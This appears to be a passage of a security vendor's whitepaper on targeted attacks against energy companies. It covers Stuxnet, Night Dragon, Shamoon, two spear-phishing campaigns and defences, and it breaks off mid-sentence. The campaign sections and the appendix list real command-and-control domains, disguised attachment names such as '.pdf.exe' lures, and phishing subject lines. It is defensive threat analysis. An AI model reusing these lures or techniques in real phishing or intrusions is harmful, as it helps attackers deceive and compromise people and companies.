    In the past there have been quite a few attacks that included targets in the energy sector. Some of these were
    more focused, like Stuxnet, Duqu, Shamoon/Disttrack and Night Dragon. Others saw power companies targeted
    among many other sectors, such as Hidden Lynx, Nitro, Flamer, Net Traveler and Elderwood to name a few.
    One of the biggest examples, and a game changer for many organizations, was Stuxnet. This targeted sabotage
    attack, which is believed to have been aimed against uranium enrichment facilities in Iran, made clear what
    could be done through cyberattacks.
    It is also clear that the energy sector is not exempt from the generic attacks that every company faces, such
    as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details. For
    example, such a case happened in May 2013, when a small fuel distribution company in North Carolina fell
    victim to a cyberheist that transferred US$800,000 from the company
s bank account. Such threats spread
    broadly and might impact any person, regardless of their employer. These attackers aim at infecting as many
    computers as possible in order to maximize their chances of profits. These attacks can include nonspecific data
    breaches where employee or customer records get stolen, as happened to the US Department of Energy in July
    2013.
    For this paper we focused on email data from targeted attacks between July 2012 and June 2013. Even though
    watering holes are becoming more frequently used in targeted attacks, it is unfortunately quite difficult to
    reliably map these to individual campaigns. A blocked drive-by download attempt does not give any indication
    if it was a targeted attack or just general noise. In quite a few cases we see the same common malware, like
    Poison Ivy, being used by generic attackers and by targeted attacks. In such cases the sole difference between a
    sophisticated targeted attack and a generic one lies in the person commanding the malware.
                                                        Page 5
EXPOSED SYSTEMS:
ONLINE AND OFFLINE
                 Experts predict
                 that billions of
                 smart meters
                 and sensors
                 will be installed
                 worldwide over the
                 next ten years.
                                                                            Targeted Attacks Against the Energy Sector
Exposed systems: Online and offline
    Historically most industrial control systems (ICS) and supervisory control and data acquisition (SCADA) systems
    were in separated networks not connected to the Internet or any other network. Unfortunately this security
    through segregation approach does not fully protect against cyberattacks. In reality, networks are rarely
    completely isolated. Often some configuration updates are periodically installed or log files are transferred. If
    systems are not directly connected, the method of choice for these types of interactions is usually through a USB
    stick or a non-permanent modem connection, which provides a way into the restricted networks. This allows
    malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet.
    If networks are truly segregated, this would mean that there would be no software updates installed, leaving
    old vulnerabilities open. There are also issues around processes. For example, the revocation lists for digital
    certificates are seldom updated and therefore certificates which are no longer valid cannot be checked properly
    and would still be accepted.
    With the increasing desire for connectivity now reaching industrial plants, many operators have started to
    connect their ICS to the Internet. New adapters can bridge to older technology which was never intended to be
    controlled over the Internet, allowing it to be connected easily. This allows for efficient centralized monitoring
    and, to some extent, remote control of equipment.
    Depending on the type of machinery controlled through the human-machine interface (HMI) of the ICS, not all
    modifications are possible. Some systems are physically connected in a pure read-only mode for monitoring.
    And even if they are fully connected, some turbines have physical limitations or emergency systems based on
    physical effects that cannot be overridden by the digital controller. Thus, not all Hollywood scenarios of open
    flood gates or turbines that fly through the air are possible. However, sabotage attacks that damage equipment
    are definitely possible, as has already been demonstrated. In the future, more systems are going to implement
    the failsafe switches in software, opening up the vector for malware attacks.
    An additional source of concern is that some countries have started to open the energy market for smaller
    private contributors. This means that almost anyone can use mini power plants like water, wind or photovoltaic
    sites to feed energy back into the power grid. Often these operators do not have a full IT staff supporting
    the facilities at hand, which might lead to more vulnerable installations. Furthermore they may deploy new
    technology which might be untested and contain some unknown vulnerabilities. While these smaller sites make
    up only a small portion of the grid, new decentralized power input feeds are a challenge for the balance of the
    power grid as well and need to be carefully monitored. Small outages or changes can have a domino effect for
    the whole power grid.
    To increase the exposure of energy firms even further, sites like SHODAN, which is essentially a search engine
    for devices, enable anyone to easily find exposed controllers on the Internet. Of course not all of the industrial
    control systems connected to the Internet are critical systems or even real ones. Some researchers have started
    to create honey pot systems in order to study the attackers, which have apparently already attracted attackers
    like the Comment Crew/APT1 group, who have broken into these decoy systems.
                                                         Page 7
                                                                           Targeted Attacks Against the Energy Sector
Smart grid: A new potential avenue of attack
    Smart grids and smart metering are
    bringing significant change to
    the world
s power systems.
    Experts predict that
    billions of smart meters
    and sensors will be
    installed worldwide
    over the next ten
    years. They enable
    utility companies
    to measure energy
    consumption at a
    more granular
    level, creating
    better flow
    patterns and
    enabling
    different
    prices for
    consumption
    based on
    the time of day and
    location. This development
    brings new opportunities, as well
    as new challenges.
    As with any connected infrastructure, it is important to
    secure the network and its endpoint on multiple levels. There have
    already been proof of concept attacks that demonstrate how smart meters could be manipulated to send
    back false information or report incorrect billing IDs, leading to power theft.
    In addition to the issue of securing these devices, smart grids will produce a huge amount of data which,
    depending on regulations, will need to be kept for audits. Some of this data may be sensitive and could raise
    privacy concerns if not properly protected. This could easily grow to petabytes of data that needs to be safely
    stored and managed.
    It is beyond the scope of this paper to address all the challenges associated with smart grids and smart meters.
    Symantec has created a dedicated whitepaper for this topic: How to protect critical infrastructure, mitigate fraud
    and guarantee privacy. As a member of the CRISALIS project, Symantec is following these developments closely
    and is helping to secure critical infrastructure together with partners from academia and different industry
    sectors.
                                                        Page 8
HISTORY OF DISCOVERED ATTACKS
                 There have
                 been numerous
                 cyberattacks
                 against the energy
                 sector over the
                 past few years.
                                                                           Targeted Attacks Against the Energy Sector
History of discovered attacks
    There have been numerous cyberattacks against the energy sector over the past few years. Not all of them were
    the work of sophisticated attackers; some incidents were just collateral damage caused by malware infections or
    bad configuration issues. These incidents highlight the fact that such attacks can happen and that they can have
    real life consequences.
  2013
    In 2013 part of the Austrian and German power grid nearly broke down after a control command was
    accidentally misdirected. It is believed that a status request command packet, which was broadcast from a
    German gas company as a test for their newly installed network branch, found its way into the systems of the
    Austrian energy power control and monitoring network. Once there, the message generated thousands of reply
    messages, which generated even more data packages, which in turn flooded the control network. To stop this
    self-inflicted DDoS attack, part of the monitoring and control network had to be isolated and disconnected.
    Fortunately the situation was resolved without any power outages.
  2008
    In 2008, Tom Donahue, a senior Central Intelligence Agency (CIA) official told a meeting of utility company
    representatives that cyberattacks had taken out power equipment in multiple cities outside the United States.
    In some cases the attacker tried to extort money from the energy companies, threatening them with further
    blackouts.
  2003
    In 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours
    due to a Slammer worm infection. Fortunately the power plant was already offline due to maintenance and the
    installed secondary backup monitoring system was unaffected by the worm. Nevertheless the incident raised
    safety concerns.
    At the beginning of 2003 a marine terminal in Venezuela was targeted by a sabotage attack. Details of this attack
    are scarce and vague, but it seems that during a strike an attacking group managed to get access to the SCADA
    network of the oil tanker loading machinery and overwrote programmable logic controllers (PLCs) with an empty
    program module. This halted machinery, preventing oil tankers from loading for eight hour till the unaffected
    backup code was reinstalled on the PLCs. The attack was not too sophisticated as it was easily spotted. A small
    modification of the PLC code instead would probably have gone unnoticed for a long time.
  2001
    In 2001 an attack took place against California
s power distribution center, which controls the flow of electricity
    across California. Due to apparently poor security configuration, the attacker was able to compromise two Web
    servers that were part of a developer network and penetrate further from there. Fortunately the attackers were
    stopped before they managed to attack any systems which were tied into the transmission grid for the Western
    United States.
  2000
    According to Russian officials, the largest natural gas extraction company in the country was successfully
    attacked in 2000. The attackers used a Trojan to gain access to the control for the gas pipelines. Through this
    switchboard, the flow for individual gas pipelines could have been modified, which would easily have caused
    widespread disruption.
                                                        Page 10
                                                                         Targeted Attacks Against the Energy Sector
  Aside from these incidents, there have also been a number of more serious and well-documented targeted
  attacks against the energy sector:
Stuxnet
  The Stuxnet incident and its relatives Duqu, Flamer and Gauss are some of the most talked-about cases of
  targeted attacks. As far as we know today, the Stuxnet operation began in November 2005 with the registration
  of the command and control (C&C) servers used in the attacks. The first recorded appearance of what we now
  call Stuxnet version 0.5 was in November 2007. Since then, a handful of different versions have been found and
  analyzed. Stuxnet 1.x is based on what is now known as the 
tilded
 platform; whereas Stuxnet 0.5 is based
  on the Flamer framework. The code segments and programming style differ, which indicates that two different
  programming teams were most likely responsible for the different branches of Stuxnet. Thorough investigation
  into the mechanism and functions of this threat started in July 2010. Stuxnet is the first known autonomous
  threat to target and sabotage industrial control systems to such an extent.
  Stuxnet is a sophisticated piece of malware, which uses seven vulnerabilities to spread and infect its targets.
  The most notable vulnerability is the Microsoft Windows Shortcut 
LNK/PIF
 Files Automatic File Execution
  Vulnerability (CVE-2010-2568), which allows it to auto-execute on USB drives. Spreading through infected
  portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the
  Internet. This was most likely the first infection vector used by Stuxnet. In addition, it is able to infect Step7
  project files, which are used to control Programmable Logic Controllers (PLCs). This allowed the worm to infect
  computers whenever the engineer exchanged the project files. Besides this, it also spread through network
  shares, a printer spooler vulnerability, an old Windows RPC (remote procedure calls) vulnerability and a known
  password in the WinCC database. In the end, Stuxnet propagated further than its authors probably intended. We
  have monitored more than 40,000 infected IP addresses in 155 countries. Many of those systems are most likely
  just collateral damage and were not intended to be infected by the attackers. For example multiple computers at
  Chevron were infected by Stuxnet, without any damage being done.
  Part of the malware code was signed with stolen digital certificates making it harder to detect by security tools.
  To hide its activity even further, Stuxnet executed slightly different infection routines depending on the security
  software installed on the target. On the USB drive itself, the malware would hide its own files and even delete
  itself from it after three successful propagations. Tricks like these, to make the detection of the malware more
  difficult, are now frequently used in modern targeted attacks.
  Stuxnet
s payload focused on PLCs, which are used to control different industrial components. The target of the
  Stuxnet operation is believed to be a uranium enrichment facility in Iran. The sabotage payload disrupted and
  partially destroyed the cascaded high frequency gas centrifuges. The early version of Stuxnet targeted the S7-
  417 PLCs and modified its valve settings. Closing the valves at certain points in time would lead to an increase
  of pressure that could damage the equipment. The later version of the threat focused on the S7-315 PLCs,
  manipulating the spinning frequency of the rotating motors. By speeding the centrifuges up and slowing them
  down repeatedly, the output quality could be spoiled and the centrifuges themselves could be damaged. The
  payload would only become active if the fingerprint in the found PLC setup matched a given configuration setup.
  This minimized the collateral damage at other facilities and showed that the attackers had in-depth knowledge
  of the targeted uranium enrichment facilities. To avoid detection by personnel monitoring the human machine
  interface (HMI) of the plant, the threat recorded measurement readings during normal operation and played
  those back in a loop.
Night Dragon
  Operation Night Dragon, which was uncovered in 2010, is a typical example of global oil companies being
  targeted, but this time not with the aim of disruption in mind. The attacks started in late 2009 and were directed
  at finding project details and financial information about oil and gas field exploration and bids.
  The attackers started by compromising public facing Web servers through SQL injection and installing Web
  shells on them. Once they had control over the server they used common hacking tools to harvest local
                                                      Page 11
                                                                          Targeted Attacks Against the Energy Sector
  passwords, dump password hashes, sniff authentication messages and exploit internal active directory
  configuration. This allowed them to move on to other internal computers using the gathered passwords. In
  addition, spear phishing messages were used to compromise additional computers. The attackers did not use
  any zero-day vulnerabilities during their attacks. Rather they used publicly available tools for each individual job.
  On compromised computers a common Backdoor.Trojan was installed that communicated back to the
  C&C server, allowing remote access to the computer. This allowed the attacker to find and extract valuable
  information.
Shamoon/Disttrack
  In August 2012 an extremely destructive cyberattack hit an estimated 30,000 computers at one of the largest oil
  producers of the world in Saudi Arabia. The W32.Disttrack malware used in this attack, also known as Shamoon,
  consists of three components: a dropper, a wiper and a reporter module.
  The dropper component is responsible for creating all the required files on the system, registering a service
  called 
TrkSvr
 in order to start itself with Windows. It also attempts to copy itself to accessible network shares
  and execute itself remotely if successfully copied.
  The wiper component is only activated when a hardcoded configuration date has been passed. This enables a
  coordinated, 
time bomb
 scenario. The module then drops a legitimate and digitally signed device driver that
  provides low level disk access from user space. The malware collects file names and starts overwriting them
  with a JPEG image or 192KB blocks of random data. At the end Disttrack finishes the computer off by wiping the
  master boot record with the same data.
  The reporter component is responsible for sending back a HTTP GET request to the C&C server. It reports the
  domain name, IP address and number of files overwritten.
  By acquiring user credentials and gaining access to the domain controller the attackers were able to push the
  malware on to many systems before they triggered the destructive payload. Disttrack
s secondary goal may have
  been to steal valuable information from infected computers, but the main intent was to render the computers
  unusable by wiping the operating system and master boot record, causing disruption and downtime at the
  targeted company. Although wiping is also frequently used to destroy evidence of the attack and make forensics
  more difficult. The malware does not contain any payload against ICS, like Stuxnet does for PLCs, and is not as
  sophisticated. According to the company, no computer related with the production or distribution of oil was
  affected, since the operational network is separated and specially protected.
  One group that claimed responsibility for the attack posted on Pastebin that it was an anti-oppression hacker
  group. The attack was prompted by disappointment with some of the regimes in the Middle East, the group said.
  True or not, this shows that it is not necessarily only state-sponsored attackers who are carrying out disruptive
  attacks. Sabotage attacks usually fall into the orbit of hacktivists, who seek attention rather than profit. Some
  sources reported that the attackers had help from insiders, which would explain the so far unclear infection
  vector.
  Soon after this attack became known, a Qatari gas company was attacked in a similar way.
                                                       Page 12
SPEAR PHISHING ATTACKS
IN THE ENERGY SECTOR
 A spear phishing
 attack consists
 of an email with
 either a malicious
 attachment or a
 link to a malicious
 website.
                                                                            Targeted Attacks Against the Energy Sector
Spear phishing attacks in the energy sector
    Spear phishing is, along with watering hole attacks, one of the most common attack vectors used to
    attack companies. The attacks are simple to carry out. They often follow the same pattern, starting with a
    reconnaissance phase to gather all publicly available information. This is followed by the incursion phase of
    breaking in and compromising computers. After that comes the discovery phase, where the attacker gathers
    passwords and maps the internal network. The final stage is capture and exfiltration, where the valuable
    information is copied and sent back to the attacker. The last phase may also involve a disruption attack if the
    goal is sabotage. For a more detailed analysis of the attack phases, see Appendix C.
    A spear phishing attack consists of an email with either a malicious attachment or a link to a malicious website.
    Such emails are sent in bulk to a handful of key users. These waves are often repeated till enough people fall for
    the bait and compromise their computers. For analysis on the social engineering themes used, attack details and
    attachment types used, see Appendix A.
  New Year
s campaign
    Some of the spear phishing campaigns are smaller in scale and are focused on specific targets. For example, on
    January 1, 2013 a global energy research company was targeted.
    A wave of spear phishing emails were sent from two Freemailer accounts to 291 individuals at the targeted
    company. All receiving email addresses started with a letter between G and R, covering half of the alphabet.
    Whether there was a second wave of emails using the other half of the alphabet or whether the attackers only
    got their hands on part of the address book remains unknown.
    All emails had either the subject line 
2013,Obama QE4! Merry Christmas !
 or 
2013,Obama QE4!
. It is
    common to see spear phishing attacks take place around holidays, as people are receiving more emails during
    these times and are less likely to perform due diligence while opening them. All of the emails contained the same
    Trojan.Dropper disguised as an attachment with the filename AVP.dll.
    The malware itself drops a malicious Downloader 
clbcatq.dll
 into a newly created 
wuauclt
 directory, posing
    as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious
    code in Windows. The same family of dropper has been used in previous targeted attacks against other sectors,
    indicating that a group with multiple interests is behind the attacks. The back door provided full access to the
    compromised computers.
    A week later, on January 7, 2013, the group attacked the same company again. Seventy emails were sent to
    58 individuals using either 
2012-13 NFL Playoffs Schedule
 or 
Re: 2012-13 NFL Playoffs Schedule
 as a
    subject line. In this wave, the attackers used a similar AVP.dll to the one used before. In some of the emails, an
    additional CHM file with an old exploit was used in an effort to maximize the chances of a successful infection.
    After this second wave, the attack ceased. It is unknown if the attackers successfully retrieved the information
    they were seeking, if they installed other back door Trojans or gained passwords that allowed them to directly
    access the computers, or if they have given up on the target.
  Greek oil campaign
    A global oil company, with offices around the world, had been under continuous attack for some time, but in
    September 2012 we noticed an upsurge in activity, with 34 times more suspicious emails than on average. This
    provided a clear indication that something suspicious was going on. At the end of this wave of emails, a hotel
    chain, a rental car company and two financial institutions were also targeted by the same attacker. This may
    have been an attempt to find further information that could be used in a future social engineering attack against
    the oil company.
    In total, 136 email accounts at the oil company were targeted. A regional sales manager in Greece received
                                                        Page 14
                                                                      Targeted Attacks Against the Energy Sector
412 emails over the
12 month period,
with 155 different
attachments. A HR
person in the same
country received
the second largest
amount of emails with
90 in total. Seventeen
other people were
targeted between 70
and 90 times, many in
the same region. The
rest of the targeted
people received less
than five emails each,
in what seems to have Figure 1. Number of emails targeting the company per day
been an undirected
spraying in the hope
that at least some would fall for the bait. Clearly the one person that received the highest volume of emails was
deemed to be of high value to the attackers. Possible explanations for the attack could be that a competitor
wanted to know more about some upcoming deal or details on the oil field exploration, but this would be highly
speculative.
The spear phishing emails came from 234 spoofed addresses. They were made to appear to be linked to the
company in relation to the subject and attachment chosen. Many of the emails came from the same country as
the main targeted sales manager.
The emails all contained malicious attachments. None of them linked to third party sites for drive-by downloads.
Of the attachments, 1,588 had a .exe extension. Of those, 842 had a .pdf.exe extension. The malware chosen
was a variant of the Poison Ivy Trojan Backdoor.Darkmoon and, in some minor cases, Trojan droppers that would
download additional malware. The attackers did not use any zero-day exploits to drop a payload.
The social engineering messages concentrated mainly around the following two themes:
E-books and newspapers:
 E-Book.pdf.exe
 BusinessWeek.pdf.exe
 Financial Times E-Paper.pdf.exe
 The Economist Print Edition.pdf.exe
 The NY Times In Print.pdf.exe
Free desktop tools:
 Babylon9 - Greek.exe
 Google Desktop Translator.exe
 SMS Free Sender Desktop.exe
 BBC iPlayer.exe
 Sticky Notes Desktop.exe
Once installed, the back door would create a registry run key in order to restart with Windows and connect to
one of three C&C servers located in Greece. The last C&C server has been used since 2010 in similar attacks
against other companies. Other sub-domains at the same free host and DNS service have been used by other
groups to spread malware in the past.
 updates.zyns.com
 amazoaws.dyndns-office.com
 msupdate.3utilities.com
                                                    Page 15
                                                                           Targeted Attacks Against the Energy Sector
    The chosen names of the C&C server domains imitates legitimate services in a bid to be overlooked by the system
    administrators when checking their logs.
    The back door provides full remote access to the compromised computers, allowing for extraction of any data. It is
    unknown if the attackers succeeded in their goal and if valuable information has been extracted. The attacks did not
    completely disappear, but the email volume decreased significantly to only a few emails per week afterwards.
Motivation and origin
    As with all targeted attacks, there are many different groups of attackers operating in this field. These attacks cannot
    be attributed to only one group or geographical region. We have seen individuals, competitors, hacktivist groups
    and possible state sponsored agents carrying out attacks against energy companies. Some of the attacks have been
    purely opportunistic, seeking any valuable information available. Other campaigns look like they were planned over a
    lengthy period and carried out methodically with a clear goal in mind.
    The attackers tend to go after valuable information, including maps of new gas fields or research on efficient
    photovoltaic generators. This information can be of great value to competitors or nations that want to make progress
    in the same field. Another motivation for attackers is to profit from the information stolen by blackmailing the
    company.
    The same information can be used to carry out sabotage attacks designed to disrupt ICSs, as the energy sector is
    also a primary target for sabotage attacks which will not generate direct profit for the attacker. A competitor might
    be interested in generating bad press and bad customer experience for a rival company, in order to win some new
    clients.
    For example, in January 2013 a group claiming to be related to Anonymous posted access details for what they said
    were Israeli SCADA systems for power plants and other systems. Meanwhile, 
Operation Save the Arctic
 targeted
    multiple oil companies around the globe in protest against drilling plans in the Arctic.
    Disgruntled employees are also a source of attacks that should not be underestimated. With their knowhow about
    internal critical processes and systems they often know how to inflict serious damage. They may be able to perform
    system modifications that could go unnoticed for a long periods.
                                                        Page 16
                                                                            Targeted Attacks Against the Energy Sector
Protection and mitigation
    For all regular client computers, the well-established best practice guidelines apply. These computers are often
    the first ones to be attacked. Once compromised, the attacker will use these computers and try to explore deeper
    into internal networks. Securing and hardening of deployed operating systems with a working strategy for patch
    deployment is important. Reoccurring security awareness training can help users to identify social engineering
    attempts and prevent them from falling victim to them in the first place.
    The company can perform penetration testing on Web and network applications but also on ICSs to identify and
    remedy any vulnerability. For examples Web applications should be tested against SQL injection attacks. This can
    also help confirm if applied polices are followed through, if the patch level is correct on all computers and if systems
    are compliant.
    Companies can monitor the Internet for information about attacks in the same vertical and apply lessons learned
    where possible.
    In addition, different layers of security products can help achieve better overall protection.
    
 Security Information and Event Manager system (SIEM): Using a SIEM can help correlate all related alerts in
       one place. This centralized view can be cross referenced with threat intelligence data to generate prioritization and
       an action plan. Painting the bigger picture of the overall security state can reveal previously unnoticed attacks.
       For example failed login attempts on internal servers could indicate a password breach. This includes logging of
       critical systems and synchronization of time among multiple systems.
    
 Ingress and egress filtering: Filtering the network traffic with firewalls, content filters and IPS allows the control
       of data flows. This can prevent attackers from reaching internal systems. It is important to also monitor outbound
       traffic, as data exfiltration is a key point for cyberespionage. It should be noted that with the increased use of
       cloud services and mobile devices, some traffic might never pass through the company
s gateways. Where traffic
       blocking is too disruptive at least monitoring should be implemented.
    
 Data loss prevention (DLP): DLP solutions can track the access and flow of critical information and prevent it
       from leaving the company or encrypt it automatically.
    
 Endpoint protection: Depending on the usage pattern of the computer, different solutions are available to protect
       the endpoint. Antivirus solution with proactive detection methods like behavioral analysis and reputation scanning
       can prevent unknown malware from installing itself. HIPS (host based intrusion prevention systems), behavioral
       lockdown or whitelisting can protect computers from any kind of unwanted tampering without the need of
       constant updates.
    
 System protection: For non-standard IT systems, hardening can increase the security. On industrial systems
       which are not often updated or that cannot be updated, exploitation can be prevented with the help of lockdown
       solutions like Symantec Critical System Protection (CSP). Through policies, only trusted system applications are
       allowed to run. ICS should be regularly checked and upgraded if new firmware exists. Where this is not possible
       HIPS and behavioral lockdown tools can be used to secure computers.
    
 Email filtering: Proper email filtering can prevent many spear phishing attempts from reaching users. They can
       help minimize the risk of an untrained user falling for social engineering tricks.
    
 Authentication: Some of the ICS contain hardcoded passwords and, wherever possible, these should be changed.
       ICS frequently use weakly authenticated protocols that allow for impersonation attacks. Where possible those
       authentication methods should be upgraded or at least closely monitored. Strong authentication or PKI should be
       used where applicable.
    Industrial control systems (ICS) should be specially protected and monitored. The control system and control
    network should be secured. Where possible, ICS should be separate from the Intranet. Isolating these networks alone
    is often not enough to protect the control network, but it can make it more difficult for attackers to succeed. For
    some systems it can make sense to have a plan to quickly disconnect or separate critical machines in the event of a
    detected cyberattack.
                                                         Page 17
CONCLUSION
 In the second
 half of 2012, the
 energy sector was
 the second most
 targeted with 16
 percent of all the
 targeted attacks.
                                                                           Targeted Attacks Against the Energy Sector
Conclusion
    Cyberespionage campaigns and sabotage attacks are becoming increasingly common, with countless threat
    actors attempting to gain a foothold in some of the best protected organizations. At this stage, roughly
    five targeted attacks per day are being mounted on firms in the energy sector. These attacks have become
    increasingly sophisticated, although the capabilities and tactics used by these threat actors vary considerably.
    In the second half of 2012, the energy sector was the second most targeted with 16 percent of all the targeted
    attacks. This strong increase was mainly due to a large scale attack against one global oil company. In the first
    half of 2013, the energy sector was ranked fifth with 7.6 percent of all attacks focused on this sector. In general
    we have observed that attackers are becoming more efficient and focusing on smaller operations that attract
    less attention.
    The attackers tend to go after valuable information 
 such as maps of a new gas field 
 but the sector is also
    a major target for sabotage attacks, which will not generate direct profit for the attacker. Such disruptive
    attacks do already happen and may lead to large financial losses. State sponsored agents, competitors, internal
    attackers or hacktivists are the most likely authors of such sabotage attacks.
    Fortunately, there have not been many successful sabotage attacks against energy companies to date. However,
    the increasing number of connected systems and centralized control for ICS systems means that the risk
    of attacks in the future will increase. Energy and utility companies need to be aware of these risks and plan
    accordingly to protect their valuable information as well as their ICS or SCADA networks.
                                                        Page 19
APPENDIX
                                                                         Targeted Attacks Against the Energy Sector
Appendix
 A. Spear phishing
   Social engineering themes used
   Social engineering is an essential part of spear phishing campaigns. A cleverly chosen, enticing message may prompt
   the user into opening an attachment. It is evident that most attackers are carefully selecting the themes that they
   use for their attacks. Some groups use real news stories and copy the text directly from the newspaper websites.
   Others try to appeal to personal hobbies in order to get the user
s attention.
   In the energy sector the most commonly used theme for spear phishing emails was money related (e.g. 
Wage Data
   2012
) followed by sports related themes (e.g. 
2012-13 NFL Playoffs Schedule
   As an example, the subject line 
Wage Data 2012
 was used in 944 emails, sent from 26 different email addresses
   to targets in nine different sectors. The attack was carried out over eight days and used the same infected Microsoft
   Word document in every instance.
   In general any topic can be used in a social engineering attempt, which makes it even harder for regular users to spot
   the attacks. Here are a few examples of subject lines used, listed by category:
   Contact detail updates:
 Updated Corporate & Regional Office Contact Information
 Updated Information For Contact List
 Address Change
   Event and conference details:
 The Energy and Economic Summit 2012
 12th Annual International Conference on Politics & International
 Fw: Doha Climate Change Conference - November 2012
 US Energy Information Administration Invitation
   Global news stories:
 BREAKING NEWS PHOTOS,BEIJING
 President Obamas Asia Policy and Upcoming Trip to the Region
 DoD Protection of Whistleblowing Spies
 U.S. Engagement in the Pacific
   Money related:
 Acknowledge Payment
 Payroll Invoice for week ending 02/15/2013 - 09509
 Bank Details/Swift Code Error
 Unable to process your most recent Payment
   Sport related:
 2012 NFL Schedule
 2012-13 NFL Playoffs Schedule
 2012-08-02 Thursdays sixth day of the 2012 Olympic Games
 London 2012 Medal Top 10
   Lifestyle related:
 125 Best Foods for Men
 2013 Lingerie Calendar... discover your deepest desires!
                                                       Page 21
                                                                        Targeted Attacks Against the Energy Sector
 8 Minutes to a Longer Life
Special interest groups:
 Shamoon Upgrade Edition Malware Might Be Flame Copycat!
 CyberAlert: Cyberattacks spread in banks all over the world
 3D printing technology used in Chinese fighter jets
 2013 Defense Industries Manufacturing
Spear phishing attack details
In the last six month of 2012 the average
number of targeted attacks observed per
day was 87 (with 14 in the energy sector).
In the first six month of 2013 the average
number decreased to 60 targeted attacks
per day (five in the energy sector). The
spike in August and September 2012
is mostly related to a large scale attack
against a global oil company. The increase
in May 2013 was due to multiple attacks
against financial services, public sector
and IT service organizations.
The government and public sector was
quantitatively the most attacked sector,
with 25.4 percent of all targeted attacks
falling in this sector for the last half of
2012 and 24 percent for the first half of       Figure 2: Number of targeted attacks per day
2013. The energy sector accounted for 7.6
percent of all targeted attacks, making it
the fifth most targeted sector in the first six month of 2013. This was a big decrease from 16.3 percent of all attacks
in the last half of 2012, when it was the second most attacked sector. This spike in 2012 is mainly due to a large
attack campaign against a global oil company which took place in September 2012.
On average we saw
18.6 mail accounts
being attacked for
any given target
company in the
last half of 2012
(60.7 in the energy
sector) and 5.6 email
accounts in the first
half of 2013 (10 in
the energy sector).
Overall, we see a
trend of the attacker
conducting more
focused attacks
against fewer
individuals. This
generates less noise
and the risk of getting
noticed or discovered
is smaller. These
emails are sent in
                          Figure 3: Top 10 of targeted attacks by vertical sectors
small bursts and then
                                                     Page 22
                                                                      Targeted Attacks Against the Energy Sector
repeated against a changing
target space till enough
computers are compromised.
Attachment types used
Half of all the attachments
analyzed used an extension that
would run directly when double
clicked. This old method is still
the most common scheme used.
Of all attachments analyzed,
38 percent were .exe and 12
percent were .src files. In total
only 6 percent used double
extensions like .pdf.exe to fool
the user. It should also be noted Figure 4: Average number of mail accounts targeted per company
that 23 percent were Microsoft
Word documents using some exploit to execute custom code on the computer.
There were also some more exotic
extensions used like AutoIt scripts
(.au3) and ZX-Edit files (.zed), but
these are the exception rather
than the rule. It might be that the
attackers tried to bypass some email
filtering software by experimenting
with different attachment types.
Sometimes even older exploits like
the Microsoft DirectX DirectShow
Length Record Remote Code
Execution Vulnerability (CVE-
2009-1539) in .mp4 files are still
occasionally used. This indicates
that either not all attackers have
the knowhow to use newer exploits
that are publicly available or they
speculate that the target has not
patched all computers. Some of
the attackers do not seem to be too
sophisticated. For example they used
www.[COMPANY-NAME].com.exe
an attachment name, clearly missing
that the 
.com
 at the end would be
sufficient to run it and the additional
.exe
 was not needed.
                                          Figure 5: Extensions used in targeted attack emails
                                                    Page 23
                                                                           Targeted Attacks Against the Energy Sector
B. Visualization with TRIAGE
  To identify a series of targeted attacks that are likely performed by the same individuals, we have used a novel attack
  attribution methodology named TRIAGE.
Developed by Symantec Research Labs,
TRIAGE is data mining software that
  relies on
multi-criteria decision analysis and intelligent data fusion algorithms to reliably link different attacks to the
  same source. This framework has been
developed in order
to automate cyberintelligence tasks and reduce the time
  needed to get insights into organized cybercrime activities. By enabling rapid analysis of large security data sets,
  Symantec analysts can then quickly and more efficiently attribute various waves of cyberattacks to a specific attack
  campaign likely run by the same individuals.
  Figure 6: Graph view of attack wave against company targeted in the New Year
s campaign
  The TRIAGE framework was recently enhanced with novel visualizations
thanks to VIS-SENSE, a European research
  project aiming at developing visual analytics technologies for network security applications.
                                                       Page 24
                                                                         Targeted Attacks Against the Energy Sector
  Figure 7: Visualization graph of the Greek oil campaign
  Since its original conception,
TRIAGE has been
  successfully used to analyze the behavior of
  cybercriminals involved in various types of Internet
  attack activities, such as rogue antivirus websites [1],
  spam botnets operations [2], scam campaigns [3] and
  targeted attacks performed via spear phishing emails
  [4,5].
C. Phases of targeted attacks
  As with any other targeted attacks, attacks against
  the energy sector often follow the same pattern. It
  can be broken down in different phases of attack. It
  should be noted that we have seen attackers modify
  their behavior and exceptions from the norm and this
  is possible especially if the target company has special
  circumstances or security measures in place.
                                                             Figure 8: Typical phases of targeted attacks
                                                       Page 25
                                                                        Targeted Attacks Against the Energy Sector
Reconnaissance phase
During this phase the attacker tries to learn as much as possible about the targeted organization.
Information sources often include social networks, job posting sites and press releases. This enables the attacker
to learn the contact details of possible target individuals as well as context that can be used in social engineering
scenarios. The attacker will often create a list of implemented security software used at the targeted company
from whatever information is available. These investigations often start completely passively without any direct
contact with the company, since there are many data sources publicly available. Subsequently the attacker can use
more interaction if needed. Some attackers go through all the effort of creating a fake social media account and
befriending key employees. After a period of small talk, to create a false sense of security, such a connection can
then be used to pass on an infected document or find out about some key information. Depending on the targeted
location, physical reconnaissance and eavesdropping may also be used.
Incursion phase
The actual break-in occurs during this phase. The attacker usually compromises the network by delivering targeted
malware to vulnerable systems or employees. There are two main avenues of attack. One is to send spear phishing
emails, where a link to a malicious website or a malicious attachment is delivered using social engineering
techniques. The second method, which is gaining traction, is watering hole attacks, where the attacker infects a
website that has a high likelihood of being visited by the intended victim. By using IP address filters before infecting
any visitor of such sites, the attacker can reduce the number of infected systems and bring it to a manageable
quantity which can be assessed manually at another time.
Some groups carefully plan watering hole attacks. For example the Hidden Lynx group stopped using a zero-day
vulnerability in a large watering hole attack after Microsoft released details on the vulnerability. This helped to cover
their activities and avoid unwanted attention. A few days later the group resumed the watering hole attack again,
this time using a different exploit.
For more difficult targets, man-in-the-middle attacks can be used. These can be performed either at the same
physical location, posing as a genuine Wi-Fi hotspot or through supply chain attacks. This can enable the attacker to
swap an update of legitimate software for a maliciously crafted version. Once the victim installs the genuine looking
update, the attacker effectively gains control over the computer. Due to the complexity of such an attack, they are
rarely used. Depending on the skills of the attacker and the time available, the attacker might also attack systems at
the perimeter, such as Web servers, and try to break in from there.
The malware used is not always sophisticated. Sometimes a regular off-the-shelf back door Trojan is used. In
these cases the person behind the malware orchestrating the commands is what makes the difference between a
targeted attack and a broad generic infection. Having said this, on very unique targets, we will often see the use
